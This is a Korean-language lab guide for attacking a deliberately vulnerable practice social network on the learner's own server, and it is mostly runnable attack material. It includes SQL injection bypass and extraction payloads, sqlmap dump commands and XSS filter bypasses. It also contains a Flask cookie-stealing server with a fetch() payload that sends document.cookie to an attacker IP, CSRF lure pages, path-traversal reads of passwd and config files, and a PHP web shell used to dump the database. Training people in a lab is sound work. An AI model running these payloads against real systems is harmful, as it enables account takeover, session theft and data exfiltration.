# 🎯 Vulnerable SNS - 공격 실습 가이드

## 목차

1. [환경 설정](#1-환경-설정)
2. [SQL Injection 공격](#2-sql-injection-공격)
3. [XSS 공격](#3-xss-공격)
4. [CSRF 공격](#4-csrf-공격)
5. [LFI 공격](#5-lfi-공격)
6. [복합 공격 시나리오](#6-복합-공격-시나리오)

---

## 1. 환경 설정

### 필요한 도구

```bash
# Python 라이브러리 설치
pip3 install requests beautifulsoup4 flask

# Burp Suite Community Edition (선택)
# https://portswigger.net/burp/communitydownload

# SQLmap (선택)
sudo apt install sqlmap -y
```

### 타겟 URL 설정

```python
# attack_config.py
TARGET_IP = "YOUR_EC2_PUBLIC_IP"
BASE_URL = f"http://{TARGET_IP}/vulnerable-sns/www"
LOGIN_URL = f"{BASE_URL}/login.php"
```

---

## 2. SQL Injection 공격

### 2.1 수동 공격

#### Step 1: 취약점 확인
```
URL: http://<EC2-IP>/vulnerable-sns/www/login.php?debug=1

Username: admin'
Password: test

→ SQL 에러 메시지 확인
```

#### Step 2: 인증 우회
```
Username: admin'--
Password: (아무거나)
→ 로그인 성공
```

#### Step 3: UNION 기반 데이터 추출
```sql
-- 컬럼 수 확인
Username: admin' ORDER BY 1--
Username: admin' ORDER BY 5--
Username: admin' ORDER BY 6--  (에러 발생 시 컬럼 수는 5개)

-- 데이터 추출
Username: admin' UniOn SeLeCt null,username,password,email,points FROM users--
```

### 2.2 Python 자동화 스크립트

```python
#!/usr/bin/env python3
# sqli_attack.py

import requests
from bs4 import BeautifulSoup

TARGET = "http://YOUR_EC2_IP/vulnerable-sns/www/login.php"

def test_sqli():
    """SQL Injection 테스트"""
    payloads = [
        ("admin'--", "test"),
        ("admin' oR '1'='1'--", "test"),
        ("admin' #", "test"),
    ]

    for username, password in payloads:
        data = {'username': username, 'password': password}
        r = requests.post(TARGET, data=data, allow_redirects=False)

        if r.status_code == 302 or 'dashboard' in r.text.lower():
            print(f"[+] SQLi 성공: {username}")
            return username

    return None

def extract_data():
    """UNION 기반 데이터 추출"""
    # 컬럼 수 확인
    for i in range(1, 10):
        username = f"admin' ORDER BY {i}--"
        data = {'username': username, 'password': 'test'}
        r = requests.post(TARGET, data=data)

        if 'error' in r.text.lower() or 'unknown column' in r.text.lower():
            columns = i - 1
            print(f"[+] 컬럼 수: {columns}")
            break

    # 데이터 추출
    union_payload = f"admin' UniOn SeLeCt null,username,password,email,points FROM users--"
    data = {'username': union_payload, 'password': 'test'}
    r = requests.post(TARGET + "?debug=1", data=data)

    # 응답 분석
    soup = BeautifulSoup(r.text, 'html.parser')
    print("[+] 추출된 데이터:")
    print(r.text[:1000])

if __name__ == "__main__":
    print("[*] SQL Injection 공격 시작...")

    # 취약점 테스트
    result = test_sqli()
    if result:
        print(f"[+] 인증 우회 성공: {result}")

    # 데이터 추출
    extract_data()
```

### 2.3 SQLmap 사용

```bash
# 기본 테스트
sqlmap -u "http://<EC2-IP>/vulnerable-sns/www/login.php" \
  --data="username=admin&password=test" \
  --level=5 --risk=3

# 데이터베이스 목록
sqlmap -u "http://<EC2-IP>/vulnerable-sns/www/login.php" \
  --data="username=admin&password=test" \
  --dbs

# 테이블 덤프
sqlmap -u "http://<EC2-IP>/vulnerable-sns/www/login.php" \
  --data="username=admin&password=test" \
  -D vulnerable_sns --tables

# users 테이블 덤프
sqlmap -u "http://<EC2-IP>/vulnerable-sns/www/login.php" \
  --data="username=admin&password=test" \
  -D vulnerable_sns -T users --dump
```

---

## 3. XSS 공격

### 3.1 Stored XSS (게시물)

#### Step 1: 기본 테스트 (차단됨)
```html
<script>alert('XSS')</script>
→ ❌ 차단됨
```

#### Step 2: 우회 기법
```html
<!-- 이미지 태그 활용 -->
<img src=x onerror=alert('XSS')>

<!-- SVG 활용 -->
<svg onload=alert(document.domain)>

<!-- Input 활용 -->
<input onfocus=alert(1) autofocus>

<!-- Body 태그 -->
<body onload=alert(document.cookie)>
```

### 3.2 쿠키 탈취 공격

#### 공격자 서버 설정
```python
#!/usr/bin/env python3
# cookie_stealer.py

from flask import Flask, request
import datetime

app = Flask(__name__)

@app.route('/steal')
def steal():
    cookie = request.args.get('c', '')
    ip = request.remote_addr
    ua = request.headers.get('User-Agent', '')

    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    # 로그 저장
    with open('stolen_cookies.txt', 'a') as f:
        f.write(f"\n{'='*70}\n")
        f.write(f"[{timestamp}]\n")
        f.write(f"IP: {ip}\n")
        f.write(f"Cookie: {cookie}\n")
        f.write(f"User-Agent: {ua}\n")

    print(f"[+] 쿠키 탈취 성공!")
    print(f"    IP: {ip}")
    print(f"    Cookie: {cookie}")

    return "OK", 200

if __name__ == '__main__':
    print("[*] 쿠키 탈취 서버 시작: http://0.0.0.0:8000")
    app.run(host='0.0.0.0', port=8000)
```

#### XSS 페이로드
```html
<!-- 공격자 서버 IP를 YOUR_IP로 변경 -->
<img src=x onerror="fetch('http://YOUR_IP:8000/steal?c='+document.cookie)">
```

### 3.3 자동화 스크립트

```python
#!/usr/bin/env python3
# xss_attack.py

import requests

TARGET = "http://YOUR_EC2_IP/vulnerable-sns/www"
SESSION = requests.Session()

def login():
    """로그인"""
    data = {'username': 'alice', 'password': 'alice2024'}
    r = SESSION.post(f"{TARGET}/login.php", data=data)
    return 'dashboard' in r.url

def post_xss(payload):
    """XSS 페이로드 게시"""
    data = {'content': payload}
    r = SESSION.post(f"{TARGET}/new_post.php", data=data)
    return '전송' in r.text or r.url == f"{TARGET}/index.php"

if __name__ == "__main__":
    print("[*] XSS 공격 시작...")

    # 로그인
    if login():
        print("[+] 로그인 성공")

    # XSS 페이로드 목록
    payloads = [
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert(document.domain)>",
        "<input onfocus=alert(1) autofocus>",
        "<img src=x onerror=\"fetch('http://YOUR_IP:8000/steal?c='+document.cookie)\">",
    ]

    # 테스트
    for payload in payloads:
        if post_xss(payload):
            print(f"[+] XSS 페이로드 삽입 성공: {payload[:50]}...")
        else:
            print(f"[-] 차단됨: {payload[:50]}...")
```

---

## 4. CSRF 공격

### 4.1 프로필 변경 공격

#### 악의적인 HTML 페이지
```html
<!DOCTYPE html>
<html>
<head>
    <title>무료 경품 이벤트!</title>
</head>
<body>
    <h1>🎉 축하합니다! 당첨되셨습니다!</h1>
    <p>경품을 받으려면 아래 버튼을 클릭하세요...</p>

    <!-- GET 기반 CSRF -->
    <img src="http://YOUR_EC2_IP/vulnerable-sns/www/profile.php?email=hacked@evil.com&full_name=Hacked&bio=CSRF%20Attack"
         style="display:none;">

    <button onclick="alert('경품이 발송되었습니다!')">경품 받기</button>
</body>
</html>
```

### 4.2 선물 전송 CSRF

```html
<!DOCTYPE html>
<html>
<head>
    <title>이벤트 참여 완료</title>
</head>
<body>
    <h1>이벤트 참여가 완료되었습니다!</h1>
    <p>잠시만 기다려주세요...</p>

    <!-- 자동 선물 전송 -->
    <form id="gift_form" method="POST"
          action="http://YOUR_EC2_IP/vulnerable-sns/www/profile.php">
        <input type="hidden" name="send_gift" value="1">
        <input type="hidden" name="receiver_id" value="1">
        <input type="hidden" name="gift_type" value="diamond">
        <input type="hidden" name="points" value="5000">
        <input type="hidden" name="message" value="CSRF Attack!">
    </form>

    <script>
        // 페이지 로드 시 자동 제출
        document.getElementById('gift_form').submit();
    </script>
</body>
</html>
```

---

## 5. LFI 공격

### 5.1 수동 공격

#### Step 1: 기본 테스트
```
file.php?name=test.txt
→ 정상 동작 확인
```

#### Step 2: 경로 탐색
```
file.php?name=../../etc/passwd
file.php?name=../../etc/hosts
file.php?name=../config.php
file.php?name=/etc/passwd
```

#### Step 3: 민감한 파일 읽기
```
file.php?name=/var/www/html/vulnerable-sns/www/config.php
file.php?name=/var/log/apache2/access.log
file.php?name=/home/ubuntu/.bash_history
```

### 5.2 웹쉘 업로드 + RCE

#### Step 1: 웹쉘 파일 생성
```php
<?php system($_GET['cmd']); ?>
```

#### Step 2: 파일 업로드
```
파일명: shell.php5
→ upload.php에서 업로드
```

#### Step 3: 웹쉘 실행
```
file.php?name=shell.php5&cmd=whoami
file.php?name=shell.php5&cmd=id
file.php?name=shell.php5&cmd=ls -la /var/www/html
file.php?name=shell.php5&cmd=cat /etc/passwd
```

### 5.3 Python 자동화 스크립트

```python
#!/usr/bin/env python3
# lfi_attack.py

import requests

TARGET = "http://YOUR_EC2_IP/vulnerable-sns/www/file.php"
SESSION = requests.Session()

def login():
    """로그인"""
    data = {'username': 'alice', 'password': 'alice2024'}
    r = SESSION.post("http://YOUR_EC2_IP/vulnerable-sns/www/login.php", data=data)
    return 'dashboard' in r.url

def test_lfi(payload):
    """LFI 테스트"""
    r = SESSION.get(TARGET, params={'name': payload})
    return r.text

def upload_webshell():
    """웹쉘 업로드"""
    files = {'file': ('shell.php5', '<?php system($_GET["cmd"]); ?>', 'application/x-php')}
    r = SESSION.post("http://YOUR_EC2_IP/vulnerable-sns/www/upload.php", files=files)
    return 'success' in r.text.lower() or 'uploaded' in r.text.lower()

def execute_cmd(cmd):
    """명령어 실행"""
    r = SESSION.get(TARGET, params={'name': 'shell.php5', 'cmd': cmd})
    return r.text

if __name__ == "__main__":
    print("[*] LFI 공격 시작...")

    # 로그인
    if login():
        print("[+] 로그인 성공")

    # LFI 페이로드 테스트
    payloads = [
        "../../etc/passwd",
        "/etc/passwd",
        "../config.php",
        "/var/log/apache2/access.log",
    ]

    for payload in payloads:
        result = test_lfi(payload)
        if 'root:' in result or 'DB_' in result:
            print(f"[+] LFI 성공: {payload}")
            print(f"[+] 내용: {result[:200]}...")
            break

    # 웹쉘 업로드
    if upload_webshell():
        print("[+] 웹쉘 업로드 성공")

        # 명령어 실행
        commands = ['whoami', 'id', 'pwd', 'ls -la']
        for cmd in commands:
            print(f"\n[*] 명령어 실행: {cmd}")
            output = execute_cmd(cmd)
            print(output)
```

---

## 6. 복합 공격 시나리오

### 시나리오 1: SQLi → 관리자 탈취 → XSS → 쿠키 탈취

```python
#!/usr/bin/env python3
# combined_attack_1.py

import requests

TARGET = "http://YOUR_EC2_IP/vulnerable-sns/www"

# Step 1: SQLi로 관리자 로그인
print("[1] SQL Injection으로 관리자 로그인...")
data = {'username': "admin'--", 'password': 'test'}
session = requests.Session()
r = session.post(f"{TARGET}/login.php", data=data)

if 'dashboard' in r.url:
    print("[+] 관리자 로그인 성공")

    # Step 2: XSS 페이로드 삽입
    print("[2] XSS 페이로드 삽입...")
    xss_payload = "<img src=x onerror=\"fetch('http://YOUR_IP:8000/steal?c='+document.cookie)\">"
    data = {'content': xss_payload}
    session.post(f"{TARGET}/new_post.php", data=data)
    print("[+] XSS 페이로드 게시 완료")
    print("[+] 다른 사용자가 게시물을 보면 쿠키가 탈취됩니다.")
```

### 시나리오 2: LFI → 웹쉘 → DB 정보 탈취

```python
#!/usr/bin/env python3
# combined_attack_2.py

import requests

TARGET = "http://YOUR_EC2_IP/vulnerable-sns/www"

# 로그인
session = requests.Session()
data = {'username': 'alice', 'password': 'alice2024'}
session.post(f"{TARGET}/login.php", data=data)

# Step 1: LFI로 config.php 읽기
print("[1] LFI로 설정 파일 읽기...")
r = session.get(f"{TARGET}/file.php", params={'name': '../config.php'})
print(r.text[:500])

# Step 2: 웹쉘 업로드
print("[2] 웹쉘 업로드...")
files = {'file': ('backdoor.php5', '<?php system($_GET["x"]); ?>', 'text/plain')}
session.post(f"{TARGET}/upload.php", files=files)

# Step 3: 웹쉘로 MySQL 덤프
print("[3] 데이터베이스 덤프...")
cmd = "mysqldump -u root -pvulnerable123 vulnerable_sns users"
r = session.get(f"{TARGET}/file.php", params={'name': 'backdoor.php5', 'x': cmd})
print(r.text)
```

### 시나리오 3: CSRF + XSS 체인 공격

```html
<!DOCTYPE html>
<html>
<head>
    <title>이벤트</title>
</head>
<body>
    <h1>이벤트 참여 중...</h1>

    <!-- Step 1: CSRF로 프로필 변경 -->
    <img src="http://YOUR_EC2_IP/vulnerable-sns/www/profile.php?bio=<img src=x onerror=alert(1)>"
         style="display:none;">

    <!-- Step 2: CSRF로 XSS 페이로드가 담긴 게시물 작성 -->
    <form id="xss_post" method="POST"
          action="http://YOUR_EC2_IP/vulnerable-sns/www/new_post.php">
        <input type="hidden" name="content"
               value="<img src=x onerror='fetch(\"http://YOUR_IP:8000/steal?c=\"+document.cookie)'>">
    </form>

    <script>
        setTimeout(() => {
            document.getElementById('xss_post').submit();
        }, 1000);
    </script>
</body>
</html>
```

---

## ⚠️ 주의사항

**중요:**
- 이 가이드는 **교육 목적**으로만 사용하세요
- 허가받지 않은 시스템에 대한 공격은 **불법**입니다
- 프로젝트 환경에서만 테스트하세요
- 발견한 취약점은 팀과 공유하세요

---

## 📚 추가 학습 자료

- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- PortSwigger Web Security Academy: https://portswigger.net/web-security
- PentesterLab: https://pentesterlab.com/
- HackTheBox: https://www.hackthebox.com/

**Happy Hacking! 🚀**
